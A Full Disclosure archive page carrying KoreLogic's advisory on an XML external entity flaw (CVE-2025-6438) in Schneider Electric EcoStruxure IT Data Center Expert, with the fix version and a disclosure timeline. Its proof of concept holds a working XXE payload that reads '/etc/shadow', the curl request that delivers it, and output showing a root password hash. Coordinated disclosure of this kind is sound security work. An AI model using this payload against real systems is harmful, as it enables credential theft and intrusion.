---
title: KL-001-2025-006: Schneider Electric EcoStruxure IT Data Center Expert XML External Entities Injection
url: https://seclists.org/fulldisclosure/2025/Jul/5
source: Full Disclosure
date: 2025-07-10
fetch_date: 2025-10-06T23:53:12.853950
---

# KL-001-2025-006: Schneider Electric EcoStruxure IT Data Center Expert XML External Entities Injection

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](4)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](6)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-006: Schneider Electric EcoStruxure IT Data Center Expert XML External Entities Injection

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 9 Jul 2025 17:14:45 -0500

---

```
KL-001-2025-006: Schneider Electric EcoStruxure IT Data Center Expert XML External Entities Injection

Title: Schneider Electric EcoStruxure IT Data Center Expert XML External Entities Injection
Advisory ID: KL-001-2025-006
Publication Date: 2025-07-09
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-006.txt

1. Vulnerability Details

     Affected Vendor: Schneider Electric
     Affected Product: EcoStruxure IT Data Center Expert
     Affected Version: 8.3 and prior
     Platform: CentOS
     CWE Classification: CWE-611: Improper Restriction of XML
                         External Entity Reference
     CVE ID: CVE-2025-6438

2. Vulnerability Description

     The "DataExchange" route allows the XML body of
     SOAP requests to contain references to external entities.
     This allows an unauthenticated attacker to read local
     files, perform server-side request forgery, and overwhelm
     the web server resources.

3. Technical Description

     From an authenticated perspective a user can send SOAP requests
     to the "/DataExchange/DataExchangeService" web route, providing
     an XML document in the POST body. When the web application
     processes the XML it will insecurely resolve entities that
     reference external resources, such as local files.

     The "GetHistoryRequest" SOAP action can be utilized to
     exfiltrate the resolved value by placing the entity reference
     within the XML document's "Id" parameter. The resulting error
     message reflects the value of the resolved entity, such as
     contents of a local file.

4. Mitigation and Remediation Recommendation

     Version 9.0 of EcoStruxure IT Data Center Expert includes
     fixes for these vulnerabilities and is available upon request
     from Schneider Electric's Customer Care Center. Refer to
https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2025-189-01&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2025-189-01.pdf.

5. Credit

     This vulnerability was discovered by Jaggar Henry and Jim
     Becher of KoreLogic, Inc.

6. Disclosure Timeline

     2024-11-21 : KoreLogic reports vulnerability details to
                  Schneider Electric CPCERT.
     2024-11-22 : Vendor acknowledges receipt of KoreLogic's
                  submission.
     2024-12-06 : Vendor confirms the reported vulnerability.
     2024-12-12 : Vendor requests a meeting with KoreLogic to discuss
                  the timeline of remediation efforts for this
                  vulnerability, as well as for associated submissions
                  from KoreLogic.
     2024-12-18 : KoreLogic and Schneider Electric agree to embargo
                  vulnerability details until product update 9.0,
                  circa July, 2025.
     2025-01-29 : Vendor provides status update.
     2025-03-17 : Vendor provides beta release containing remediation
                  for this and other associated vulnerabilities
                  reported by KoreLogic.
     2025-06-20 : Vendor notifies KoreLogic that the publication date
                  for this vulnerability will be 2025-07-08.
     2025-07-08 : Vendor public disclosure.
     2025-07-09 : KoreLogic public disclosure.

7. Proof of Concept

    [attacker@box]$ cat payload
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/shadow'>]>
```

    <soapenv:Envelope xmlns:soapenv="[http://schemas.xmlsoap.org/soap/envelope/"](http://schemas.xmlsoap.org/soap/envelope/%22);
xmlns:ns="[http://www.schneider-electric.com/common/dataexchange/2011/05"](http://www.schneider-electric.com/common/dataexchange/2011/05%22);>

```
       <soapenv:Header/>
       <soapenv:Body>
          <ns:GetHistoryRequest>
             <ns:GetHistoryParameter>
                <ns:Id>&test;</ns:Id>
             </ns:GetHistoryParameter>
             <ns:GetHistoryFilter>
             </ns:GetHistoryFilter>
          </ns:GetHistoryRequest>
       </soapenv:Body>
    </soapenv:Envelope>

    [attacker@box]$ curl --digest --user kore:logic                                  \
                         -k https://dce.example.com/DataExchange/DataExchangeService \
                         -H 'Content-Type: text/xml' --data @payload
```

    <soap:Envelope xmlns:soap="[http://schemas.xmlsoap.org/soap/envelope/"](http://schemas.xmlsoap.org/soap/envelope/%22); xmlns:xsd="[http://www.w3.org/2001/XMLSchema"](http://www.w3.org/2001/XMLSchema%22);
xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance"](http://www.w3.org/2001/XMLSchema-instance%22);><soap:Body><soap:Fault><faultcode>soap:Client</faultcode><faultstring>Invalid
Id</faultstring><detail><Fault\_Invalid\_Id
xmlns="[http://www.schneider-electric.com/common/dataexchange/2011/05/DataExchangeInterface/Fault"](http://www.schneider-electric.com/common/dataexchange/2011/05/DataExchangeInterface/Fault%22);>root:$6$nAQ9/nHfzNJH2Q28$t0.KyJ810alBDwz3NGyEWNGWzQgXdrsUooT1UbXKz9SfpkHLaZngVY6oA8TVCYnCqP2boorvDsmufXawpy1T41:20021:0:99999:7:::

```
    bin:*:19767:0:99999:7:::
    daemon:*:19767:0:99999:7:::
    adm:*:19767:0:99999:7:::
    lp:*:19767:0:99999:7:::
    mail:*:19767:0:99999:7:::
    ...

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-5/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](4)
[By Date](date.html#5)
[![Next](/images/right-icon-16x16.png)](6)

[![Previous](/images/left-icon-16x16.png)](4)
[By Thread](index.html#5)
[![Next](/images/right-icon-16x16.png)](6)

### Current thread:

* **KL-001-2025-006: Schneider Electric EcoStruxure IT Data Center Expert XML External Entities Injection** *KoreLogic Disclosures via Fulldisclosure (Jul 09)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.or...